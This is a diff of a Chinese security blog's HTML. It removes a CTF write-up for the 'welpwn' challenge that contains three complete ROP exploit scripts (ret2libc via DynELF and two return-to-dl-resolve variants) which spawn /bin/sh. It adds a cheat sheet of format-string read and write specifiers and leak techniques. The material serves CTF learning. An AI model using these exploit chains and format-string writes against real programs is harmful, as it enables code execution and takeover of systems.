+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/07/fsb-sum-up/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -909,21 +920,25 @@
       
         
           
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><h2 id="Bug">Bug</h2><p>漏洞在如下代码所示处</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [sp+10h] [bp-10h]@2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">        s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>普通的x86_64下的栈溢出，不过读上去的payload会被<code>\x00</code>截断，要通过<code>add $rsp; ret</code>来跳到完整的payload上</p>
-<p>之后就是常规的<strong><em>memory dump + return to libc</em></strong>，其实可以直接利用<strong><em>libc-database</em></strong>来泄露libc，不过<strong><em>libc-database</em></strong>上只有Ubuntu的libc貌似，所以还是练习了下使用<strong><em>DynELF</em></strong></p>
-<p>这题还可以用<strong><em>return to dl-resolve</em></strong>来解决，之前只写过32位的，这次就再写了下，练习了64位下的，64位下不同的地方就是<code>reloc_arg</code>变成0x18为一个单位，另外<code>Elf64_Sym</code>结构内的成员的顺序也有变化，还有就是需要泄露<code>link_map</code>，并将<code>link_map+0x1c8</code>覆盖为0x0 </p>
-<p>下面是我写好的代码，写的时候参考了<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="external">[1]</a>，以后只需要修改<code>adr_rel_plt, adr_dyn_sym, adr_dyn_str, adr_stage</code>以及用到的got表和plt表的相关函数地址</p>
-<p>另外又听说了<a href="https://github.com/inaz2/roputils" target="_blank" rel="external">roputils</a>这个工具能快速辅助编写<em>return to dl-resolve</em>，于是尝试了一发。稍微改一下demo的脚本就好了</p>
-<h1 id="Exploit">Exploit</h1><h2 id="memory_leak_+_ret2libc">memory leak + ret2libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./welpwn_932a4428ea8d4581431502ab7e66ea4b'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi     = <span class="number">0x004008a3</span></span><br><span class="line">pop_rsi_p   = <span class="number">0x004008a1</span></span><br><span class="line">p4_ret      = <span class="number">0x0040089c</span></span><br><span class="line">plt_puts    = <span class="number">0x004005a0</span></span><br><span class="line">got_write   = <span class="number">0x00601020</span></span><br><span class="line">got_puts    = <span class="number">0x00601018</span></span><br><span class="line">adr_bss     = <span class="number">0x00601000</span></span><br><span class="line">got_read    = <span class="number">0x00601038</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload  = l64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += l64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += l64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += l64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += l64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += l64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += l64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += l64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>     <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">    payload += l64(p4_ret)</span><br><span class="line">    payload += com_gadget(<span class="number">0x40089a</span>, <span class="number">0x400880</span>, jmp2 = got_write,</span><br><span class="line">            arg1 = <span class="number">0x1</span>,</span><br><span class="line">            arg2 = address,</span><br><span class="line">            arg3 = <span class="number">0x20</span>)</span><br><span class="line">    payload += l64(<span class="number">0x400630</span>) <span class="comment"># program entry</span></span><br><span class="line">    io.wl(payload)</span><br><span class="line">    leak_data = io.rtl(<span class="string">'A'</span> * <span class="number">24</span> + l64(p4_ret)[:<span class="number">3</span>]).replace(<span class="string">'Welcome to RCTF\n'</span>, <span class="string">''</span>).replace(<span class="string">'A'</span> * <span class="number">24</span> + l64(p4_ret)[:<span class="number">3</span>], <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] &#123;&#125;\t==&gt;\t&#123;&#125;'</span>.format(hex(ctypes.c_uint64(address).value), leak_data.encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(adr_system)</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">    payload += l64(p4_ret)</span><br><span class="line">    payload += com_gadget(<span class="number">0x40089a</span>, <span class="number">0x400880</span>, jmp2 = got_read,</span><br><span class="line">            arg1 = <span class="number">0x0</span>,</span><br><span class="line">            arg2 = adr_bss + <span class="number">0x80</span>,</span><br><span class="line">            arg3 = <span class="number">0x10</span>)</span><br><span class="line">    payload += com_gadget(<span class="number">0x40089a</span>, <span class="number">0x400880</span>, jmp2 = adr_bss + <span class="number">0x88</span>,</span><br><span class="line">            arg1 = adr_bss + <span class="number">0x80</span>)</span><br><span class="line">    payload += l64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    io.wl(payload)</span><br><span class="line">    io.wl(<span class="string">'/bin/sh\x00'</span> + l64(adr_system))</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = ELF(<span class="string">'welpwn_932a4428ea8d4581431502ab7e66ea4b'</span>))</span><br><span class="line"></span><br><span class="line">adr_system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system addr\t:\t'</span> + hex(adr_system)</span><br><span class="line">exp(adr_system)</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
-<h2 id="return_to_dl-resolve">return to dl-resolve</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./welpwn_932a4428ea8d4581431502ab7e66ea4b'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00000000004007cc</span>])</span><br><span class="line"></span><br><span class="line">plt_resolve = <span class="number">0x0000000000400590</span></span><br><span class="line">got_read    = <span class="number">0x0000000000601038</span></span><br><span class="line">got_write   = <span class="number">0x0000000000601020</span></span><br><span class="line">got_linkmap = <span class="number">0x0000000000601008</span></span><br><span class="line"></span><br><span class="line">leave_ret   = <span class="number">0x00000000004007cb</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400675</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004008a3</span></span><br><span class="line">p4_ret      = <span class="number">0x000000000040089c</span></span><br><span class="line"></span><br><span class="line">adr_stage   = <span class="number">0x0000000000601000</span> + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">adr_rel_plt         = <span class="number">0x0000000000400498</span></span><br><span class="line">adr_dyn_sym         = <span class="number">0x00000000004002c0</span></span><br><span class="line">adr_dyn_str         = <span class="number">0x00000000004003c8</span></span><br><span class="line">adr_fake_rel_plt    = adr_stage + <span class="number">0x100</span></span><br><span class="line">adr_fake_dyn_sym    = adr_stage + <span class="number">0x208</span></span><br><span class="line">adr_fake_dyn_str    = adr_stage + <span class="number">0x300</span></span><br><span class="line">adr_shell           = adr_stage + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">com_part1           = <span class="number">0x40089a</span></span><br><span class="line">com_part2           = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line">adr_entry           = <span class="number">0x400630</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload  = l64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += l64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += l64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += l64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += l64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += l64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += l64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += l64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>     <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak link_map</span></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload0 += l64(p4_ret)</span><br><span class="line">payload0 += com_gadget(com_part1, com_part2, got_write,</span><br><span class="line">        arg1 = <span class="number">0x1</span>,</span><br><span class="line">        arg2 = got_linkmap,</span><br><span class="line">        arg3 = <span class="number">0x8</span>)</span><br><span class="line">payload0 += l64(adr_entry)</span><br><span class="line"></span><br><span class="line">io.rl()</span><br><span class="line">io.wl(payload0)</span><br><span class="line">adr_linkmap = l64(io.r(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak link_map\t:\t'</span> + hex(adr_linkmap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite link_map+0x1c8 0x0, read fake structure</span></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload0 += l64(p4_ret)</span><br><span class="line">payload0 += com_gadget(com_part1, com_part2, got_read,</span><br><span class="line">        arg1 = <span class="number">0x0</span>,</span><br><span class="line">        arg2 = adr_linkmap + <span class="number">0x1c8</span>,</span><br><span class="line">        arg3 = <span class="number">0x8</span>)</span><br><span class="line">payload0 += com_gadget(com_part1, com_part2, got_read,</span><br><span class="line">        arg1 = <span class="number">0x0</span>,</span><br><span class="line">        arg2 = adr_stage,</span><br><span class="line">        arg3 = <span class="number">0x500</span>)</span><br><span class="line">payload0 += l64(pop_rbp_ret)</span><br><span class="line">payload0 += l64(adr_stage)</span><br><span class="line">payload0 += l64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.rl()</span><br><span class="line">io.wl(payload0)</span><br><span class="line">io.w(l64(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake structure</span></span><br><span class="line">align_rel_plt   = <span class="number">0x8</span>*<span class="number">3</span> - (adr_fake_rel_plt - adr_rel_plt) % (<span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">payload1  = <span class="string">'A'</span> * <span class="number">0x8</span></span><br><span class="line">payload1 += l64(pop_rdi_ret) <span class="comment"># set $rdi "/bin/sh"</span></span><br><span class="line">payload1 += l64(adr_shell)</span><br><span class="line">payload1 += l64(plt_resolve)</span><br><span class="line">payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (<span class="number">0x8</span> * <span class="number">3</span>))</span><br><span class="line">payload1 += l64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x100</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">align_dyn_sym   = <span class="number">0x8</span>*<span class="number">3</span> - (adr_fake_dyn_sym - adr_dyn_sym) % (<span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">payload1 += <span class="string">'A'</span> * align_rel_plt</span><br><span class="line">payload1 += l64(got_read)</span><br><span class="line">payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(<span class="number">0x8</span>*<span class="number">3</span>)*<span class="number">0x100000000</span> + <span class="number">0x7</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x208</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">payload1 += <span class="string">'A'</span> * align_dyn_sym</span><br><span class="line">payload1 += l32(adr_fake_dyn_str - adr_dyn_str)</span><br><span class="line">payload1 += l32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += l64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l64(<span class="number">0x0</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x300</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">payload1 += <span class="string">'system\x00'</span></span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x400</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">payload1 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.wl(payload1)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h2 id="return_to_dl-resolve_by_using_rop-utils">return to dl-resolve by using rop-utils</h2><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="label">from</span> roputils <span class="preprocessor">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="label">fpath</span> = <span class="string">'./welpwn_932a4428ea8d4581431502ab7e66ea4b'</span></span><br><span class="line"></span><br><span class="line"><span class="label">rop</span> = ROP(fpath)</span><br><span class="line"><span class="label">offset</span> = <span class="number">24</span></span><br><span class="line"><span class="label">p4_ret</span> = <span class="number">0x0040089c</span></span><br><span class="line"><span class="keyword">addr_stage </span>= rop<span class="preprocessor">.section</span>(<span class="string">'.bss'</span>) + <span class="number">0x400</span></span><br><span class="line"><span class="label">ptr_ret</span> = rop.search(rop<span class="preprocessor">.section</span>(<span class="string">'.fini'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span> = <span class="string">'A'</span> * offset</span><br><span class="line"><span class="keyword">buf </span>+= p64(p4_ret)</span><br><span class="line"><span class="keyword">buf </span>+= rop.call_chain_ptr(</span><br><span class="line">    [<span class="string">'write'</span>, <span class="number">1</span>, rop.got()+<span class="number">8</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="string">'read'</span>, <span class="number">0</span>, <span class="keyword">addr_stage, </span><span class="number">400</span>]</span><br><span class="line">, pivot<span class="label">=addr_stage</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="preprocessor">Proc</span>(rop.fpath)</span><br><span class="line"><span class="label">p.write</span>(<span class="keyword">buf)</span><br><span class="line"></span><span class="label">print</span> <span class="string">"[+] read: %r"</span> % p.read(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">addr_link_map </span>= p.read_p64()</span><br><span class="line"><span class="keyword">addr_dt_debug </span>= <span class="keyword">addr_link_map </span>+ <span class="number">0x1c8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span>= rop.call_chain_ptr(</span><br><span class="line">    [<span class="string">'read'</span>, <span class="number">0</span>, <span class="keyword">addr_dt_debug, </span><span class="number">8</span>],</span><br><span class="line">    [ptr_ret, <span class="keyword">addr_stage+380]</span><br><span class="line"></span>)</span><br><span class="line"><span class="keyword">buf </span>+= rop.dl_resolve_call(<span class="keyword">addr_stage+300)</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.fill(<span class="number">300</span>, <span class="keyword">buf)</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.dl_resolve_data(<span class="keyword">addr_stage+300, </span><span class="string">'system'</span>)</span><br><span class="line"><span class="keyword">buf </span>+= rop.fill(<span class="number">380</span>, <span class="keyword">buf)</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.<span class="keyword">string('/bin/sh')</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.fill(<span class="number">400</span>, <span class="keyword">buf)</span><br><span class="line"></span></span><br><span class="line"><span class="label">p.write</span>(<span class="keyword">buf)</span><br><span class="line"></span><span class="label">p.write_p64</span>(<span class="number">0</span>)</span><br><span class="line"><span class="label">p.interact</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><ol>
-<li><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="external">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a></li>
+            <p>因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。</p>
+<h1 id="0x1_使用">0x1 使用</h1><p>注：这里仅以<code>printf</code>函数为例</p>
+<h2 id="32位">32位</h2><h3 id="读">读</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$x'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 读4个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 同上面</span></span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="写">写</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$n'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 解引用，写入四个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>          <span class="comment">// 解引用，写入两个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入一个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入八个字节</span></span><br></pre></td></tr></table></figure>
+<h2 id="64位">64位</h2><h3 id="读-1">读</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$x'</span>.<span class="function"><span class="title">format</span><span class="params">(index, num)</span></span>      <span class="comment">// 读4个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lx'</span>.<span class="function"><span class="title">format</span><span class="params">(index, num)</span></span>     <span class="comment">// 读8个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 读8个字节</span></span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="写-1">写</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$n'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 解引用，写入四个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>          <span class="comment">// 解引用，写入两个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入一个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入八个字节</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>%1$lx</code>: RSI</li>
+<li><code>%2$lx</code>: RDX</li>
+<li><code>%3$lx</code>: RCX</li>
+<li><code>%4$lx</code>: R8</li>
+<li><code>%5$lx</code>: R9</li>
+<li><code>%6$lx</code>: 栈上的第一个QWORD</li>
+</ul>
+<h1 id="0x2_技巧">0x2 技巧</h1><ol>
+<li>可以泄露栈的地址</li>
+<li>泄露__libc_start_main_ret （在堆利用中遇到过一次，alictf-qual-2016-fb, bctf-qual-2016-bcloud）</li>
+<li>泄露canary</li>
+<li>利用相邻ebp之间的引用关系，实现理论上的任意地址读写 (参考pwnable.kr-fsb 和 rctf-qual-2015-nobug，其实感觉不太好用，需要连着两次的fsb才行)</li>
 </ol>
 
           
@@ -998,7 +1013,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">31</span>
+              <span class="site-state-item-count">32</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1006,7 +1021,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1015,7 +1030,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-count">37</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
